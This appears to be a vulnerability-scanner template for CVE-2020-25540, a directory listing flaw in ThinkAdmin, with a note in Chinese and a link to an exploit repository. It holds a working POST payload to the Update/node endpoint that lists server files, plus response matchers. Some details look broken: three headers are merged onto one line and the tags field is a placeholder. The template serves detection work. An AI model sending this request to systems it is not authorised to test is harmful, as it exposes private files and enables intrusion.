id: thinkadmin-node-lfi
info:
  name: thinkadmin-node-lfi
  author: apple
  severity: high
  description: 漏洞发现者原话：2020.08.03.01，≤这个版本的都有可能存在漏洞
  reference:
    - https://github.com/ybdt/exp-hub/blob/master/03-ThinkPHP%E7%B3%BB%E5%88%97/ThinkAdmin%E5%88%97%E7%9B%AE%E5%BD%95%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-25540%EF%BC%89/readme.md
  tags: tags
http:
  - raw:
      - |-
        POST /ThinkAdmin-6/public/index.php/admin/login.html?s=admin/api.Update/node HTTP/1.1
        Host: {{Hostname}}
        Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 22

        rules=%5B%22.%2F%22%5D
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'hash'
      - type: word
        part: body
        words:
          - 'name'
